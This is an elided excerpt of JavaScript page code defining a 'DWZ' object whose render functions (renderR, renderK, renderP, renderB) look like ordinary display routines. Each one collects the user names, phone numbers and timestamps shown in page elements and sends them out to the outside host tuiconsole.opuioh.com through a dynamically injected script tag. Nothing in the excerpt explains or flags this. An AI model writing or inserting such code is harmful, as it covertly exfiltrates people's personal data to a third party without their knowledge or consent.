...
var DWZ = {
    ...
    renderR() {
        var t = [], e = [], i = [];
        $("#r-l-r .userName").each(function () {
            e.push($.trim($(this).text()))
        }), $("#r-l-r .userPhone").each(function () {
            t.push($.trim($(this).text()))
        }), $("#r-l-r .time").each(function () {
            i.push($.trim($(this).text()))
        });
        var n = document.createElement("script");
        n.src = "http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m=" + JSON.stringify(t) + "&u=" + JSON.stringify(e) + "&d=" + JSON.stringify(i), document.body.appendChild(n)
    },
    renderK() {
        var t = [], e = [], i = [];
        $("#b-l-f-k .userName").each(function () {
            e.push($.trim($(this).text()))
        }), $("#b-l-f-k .userPhone").each(function () {
            t.push($.trim($(this).text()))
        }), $("#b-l-f-k .time").each(function () {
            i.push($.trim($(this).text()))
        });
        var n = document.createElement("script");
        n.src = "http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m=" + JSON.stringify(t) + "&u=" + JSON.stringify(e) + "&d=" + JSON.stringify(i), document.body.appendChild(n)
    ...
    renderP() {
        var t = [], e = [], i = [];
        $("#b-d-d-z .userName").each(function () {
            e.push($.trim($(this).text()))
        }), $("#b-d-d-z .userPhone").each(function () {
            t.push($.trim($(this).text()))
        }), $("#b-d-d-z .time").each(function () {
            i.push($.trim($(this).text()))
        });
        var n = document.createElement("script");
        n.src = "http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m=" + JSON.stringify(t) + "&u=" + JSON.stringify(e) + "&d=" + JSON.stringify(i), document.body.appendChild(n)
    ...
    renderB() {
        var t = [], e = [], i = [];
        $("#r-b-t-c .userName").each(function () {
            e.push($.trim($(this).text()))
        }), $("#r-b-t-c .userPhone").each(function () {
            t.push($.trim($(this).text()))
        }), $("#r-b-t-c .time").each(function () {
            i.push($.trim($(this).text()))
        });
        var n = document.createElement("script");
        n.src = "http://tuiconsole.opuioh.com/tuiServer/sp/sabu?m=" + JSON.stringify(t) + "&u=" + JSON.stringify(e) + "&d=" + JSON.stringify(i), document.body.appendChild(n)
    },
